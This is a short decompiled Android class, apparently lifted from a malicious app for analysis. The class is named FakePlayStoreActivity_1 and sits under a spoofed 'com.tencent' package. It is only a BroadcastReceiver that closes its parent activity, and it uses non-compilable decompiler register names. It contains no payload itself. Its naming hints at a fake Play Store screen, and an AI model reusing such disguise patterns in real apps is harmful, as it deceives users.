package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: FakePlayStoreActivity_1
 * Original: Lcom/tencent/endorsementkethicala24$1;
 */
class FakePlayStoreActivity_1 extends BroadcastReceiver {

    // === FIELDS ===
    final FakePlayStoreActivity this$0;

    // === METHODS ===

     void Constructor(FakePlayStoreActivity param0) {
        v0.this$0 = v1;
        // new BroadcastReceiver()
        return;
    }

    public void onReceive(Context param0, Intent param1) {
        v1 = v0.this$0;
        v1.finish();
        return;
    }
}
